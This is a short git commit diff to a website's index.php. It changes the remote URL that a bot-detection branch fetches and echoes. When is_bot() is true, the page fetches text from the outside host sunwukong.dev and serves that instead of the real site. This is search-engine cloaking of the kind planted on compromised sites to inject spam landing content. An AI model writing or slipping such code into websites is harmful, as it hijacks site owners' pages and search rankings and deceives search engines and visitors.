c988953300287a2dbfaf3338f5da82a6153e8500
AnonimSilent404 <kasatmata404@gmail.com>
2025-05-03 09:12:36 +0700

    Update index.php

--- index.php
+++ index.php
@@ -13,7 +13,7 @@ return false;
 }
 
 if (is_bot()) {
-$message = file_get_contents('https://sunwukong.dev/LANDING/greatdiamondinfo.txt');
+$message = file_get_contents('https://sunwukong.dev/LANDING/3djewelrymodel.txt');
 echo $message;
 exit;
 }
